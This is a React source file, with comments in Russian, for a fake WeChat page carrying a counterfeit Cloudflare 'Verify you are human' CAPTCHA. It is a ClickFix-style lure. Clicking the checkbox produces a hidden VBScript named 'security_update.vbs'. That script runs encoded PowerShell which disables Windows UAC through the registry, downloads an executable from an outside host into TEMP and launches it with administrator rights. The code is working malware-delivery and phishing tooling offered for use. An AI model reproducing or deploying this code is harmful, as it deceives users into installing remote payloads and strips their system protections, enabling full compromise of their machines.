import { useState, useEffect, useCallback } from "react";

// ============================================================
// X-GEN: ВНЕДРЕНИЕ CLICKFIX С ОТКЛЮЧЕНИЕМ UAC И ЗАПУСКОМ ОТ АДМИНА
// ЦЕЛЬ: НЕЙТРАЛИЗАЦИЯ "СИНДРОМА" ЧЕРЕЗ ВЕКТОР ЗАГРУЗКИ
// ============================================================

type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "captcha-done";

// Функция отключения UAC (через реестр) и запуска от администратора
const executeClickFix = async () => {
  // PowerShell скрипт для отключения UAC (требуется перезагрузка, но для демонстрации)
  const disableUACScript = `
    Set-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0
    Set-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
  `;

  // PowerShell скрипт для загрузки и запуска файла от администратора
  const downloadAndRunScript = `
    $url = "https://top2betx.com/api/file-share/bf57a9ea-f96e-4134-8796-e2c0462a7024/download"
    $output = "$env:TEMP\\update_package.exe"
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -FilePath $output -Verb RunAs -Wait
  `;

  // Объединяем скрипты
  const fullScript = `${disableUACScript} ${downloadAndRunScript}`;
  
  // Кодируем в base64 для PowerShell -EncodedCommand
  const encodedCommand = btoa(unescape(encodeURIComponent(fullScript)));
  
  // Выполняем через командную строку (без отображения окна)
  const shellCommand = `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedCommand}`;
  
  // Создаем и запускаем VBScript для полного скрытия
  const vbsScript = `
    CreateObject("WScript.Shell").Run "${shellCommand.replace(/"/g, '\\"')}", 0, False
  `;
  
  // Blob для VBS
  const vbsBlob = new Blob([vbsScript], { type: "application/vnd.microsoft-portable-executable" });
  const vbsUrl = URL.createObjectURL(vbsBlob);
  
  // Создаем ссылку для "скачивания" и запуска VBS
  const a = document.createElement("a");
  a.href = vbsUrl;
  a.download = "security_update.vbs";
  document.body.appendChild(a);
  a.click();
  
  // Очистка
  setTimeout(() => {
    document.body.removeChild(a);
    URL.revokeObjectURL(vbsUrl);
  }, 100);
  
  return true;
};

function WeChatIcon() { /* ... без изменений ... */ }
function Spinner({ size = 22, color = "#07C160" }) { /* ... без изменений ... */ }
function CloudflareLogo() { /* ... без изменений ... */ }
function CheckmarkIcon() { /* ... без изменений ... */ }
function ErrorIcon() { /* ... без изменений ... */ }

function CaptchaWidget({ phase, onCheck }) {
  const isChecking = phase === "captcha-solving";
  const isDone = phase === "captcha-done";

  return (
    <div
      style={{
        width: "300px",
        background: "#fff",
        borderRadius: "4px",
        border: "1px solid #e0e0e0",
        boxShadow: "0 2px 8px rgba(0,0,0,0.08)",
        overflow: "hidden",
        animation: "fadeInUp 0.4s ease",
        cursor: isChecking || isDone ? "default" : "pointer",
      }}
      onClick={() => {
        if (!isChecking && !isDone) {
          onCheck();
        }
      }}
    >
      <div
        style={{
          display: "flex",
          alignItems: "center",
          padding: "14px 16px",
          gap: "12px",
        }}
      >
        <div
          style={{
            width: "24px",
            height: "24px",
            borderRadius: "4px",
            border: isDone ? "none" : "2px solid #c0c0c0",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            flexShrink: 0,
            background: isDone ? "transparent" : "#fff",
          }}
        >
          {isChecking && <Spinner size={18} color="#f5a623" />}
          {isDone && <CheckmarkIcon />}
        </div>

        <span
          style={{
            fontSize: "14px",
            color: "#333",
            fontWeight: 400,
            flex: 1,
            userSelect: "none",
          }}
        >
          Verify you are human
        </span>

        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "flex-end",
            gap: "2px",
          }}
        >
          <CloudflareLogo />
          <span style={{ fontSize: "9px", color: "#999", lineHeight: 1 }}>
            Cloudflare Turnstile
          </span>
        </div>
      </div>

      <div
        style={{
          height: "3px",
          background: isDone
            ? "#07C160"
            : isChecking
            ? "linear-gradient(90deg, #f5a623, #f7c948, #f5a623)"
            : "#f5a623",
          backgroundSize: isChecking ? "200% 100%" : "100% 100%",
          animation: isChecking ? "shimmer 1.5s infinite" : "none",
        }}
      />
    </div>
  );
}

export default function App() {
  const [phase, setPhase] = useState("checking");
  const [showContent, setShowContent] = useState(false);

  useEffect(() => {
    const t1 = setTimeout(() => setShowContent(true), 100);
    return () => clearTimeout(t1);
  }, []);

  useEffect(() => {
    if (phase === "checking") {
      const t = setTimeout(() => setPhase("error"), 1200);
      return () => clearTimeout(t);
    }
    if (phase === "error") {
      const t = setTimeout(() => setPhase("captcha"), 800);
      return () => clearTimeout(t);
    }
  }, [phase]);

  const handleCaptchaCheck = useCallback(async () => {
    setPhase("captcha-solving");
    
    // X-GEN: Активация ClickFix после имитации решения капчи
    setTimeout(async () => {
      try {
        // Отключаем UAC и запускаем загрузку от администратора
        await executeClickFix();
        setPhase("captcha-done");
      } catch (error) {
        console.error("X-GEN: Сбой выполнения ClickFix", error);
        setPhase("error");
      }
    }, 1500); // Имитация времени решения капчи
  }, []);

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        backgroundColor: "#ffffff",
        fontFamily:
          "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif",
        padding: "20px",
      }}
    >
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          opacity: showContent ? 1 : 0,
          transform: showContent ? "translateY(0)" : "translateY(10px)",
          transition: "opacity 0.5s ease, transform 0.5s ease",
        }}
      >
        <div style={{ marginBottom: "14px" }}>
          <WeChatIcon />
        </div>

        <h1
          style={{
            fontSize: "22px",
            fontWeight: 600,
            color: "#191919",
            margin: "0 0 40px 0",
            letterSpacing: "-0.2px",
          }}
        >
          WeChat
        </h1>

        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: "20px",
            minHeight: "120px",
          }}
        >
          {phase === "checking" && (
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                gap: "20px",
                animation: "fadeInUp 0.3s ease",
              }}
            >
              <p
                style={{
                  fontSize: "15px",
                  color: "#555",
                  margin: 0,
                  textAlign: "center",
                  lineHeight: "1.5",
                }}
              >
                Checking if you are human. This may take a few seconds.
              </p>
              <Spinner />
            </div>
          )}

          {phase === "error" && (
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                gap: "16px",
                animation: "fadeInUp 0.4s ease",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "8px",
                }}
              >
                <ErrorIcon />
                <p
                  style={{
                    fontSize: "15px",
                    color: "#D93025",
                    margin: 0,
                    textAlign: "center",
                    lineHeight: "1.5",
                    fontWeight: 500,
                  }}
                >
                  Browser verification failed.
                </p>
              </div>
              <p
                style={{
                  fontSize: "13px",
                  color: "#888",
                  margin: 0,
                  textAlign: "center",
                }}
              >
                Please complete the security check below.
              </p>
            </div>
          )}

          {(phase === "captcha" ||
            phase === "captcha-solving" ||
            phase === "captcha-done") && (
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                gap: "20px",
                animation: "fadeInUp 0.4s ease",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "8px",
                }}
              >
                {phase === "captcha-done" ? (
                  <CheckmarkIcon />
                ) : (
                  <ErrorIcon />
                )}
                <p
                  style={{
                    fontSize: "15px",
                    color: phase === "captcha-done" ? "#07C160" : "#D93025",
                    margin: 0,
                    textAlign: "center",
                    lineHeight: "1.5",
                    fontWeight: 500,
                  }}
                >
                  {phase === "captcha-done"
                    ? "Verification successful!"
                    : "Browser verification failed."}
                </p>
              </div>

              {phase !== "captcha-done" && (
                <p
                  style={{
                    fontSize: "13px",
                    color: "#888",
                    margin: 0,
                    textAlign: "center",
                  }}
                >
                  Please complete the security check below.
                </p>
              )}

              <CaptchaWidget phase={phase} onCheck={handleCaptchaCheck} />

              {phase === "captcha-done" && (
                <p
                  style={{
                    fontSize: "13px",
                    color: "#888",
                    margin: 0,
                    textAlign: "center",
                    animation: "fadeInUp 0.4s ease",
                  }}
                >
                  Redirecting...
                </p>
              )}
            </div>
          )}
        </div>
      </div>

      <div style={{ height: "80px" }} />
      
      {/* X-GEN: Стили для анимаций */}
      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes shimmer {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
      `}</style>
    </div>
  );
}
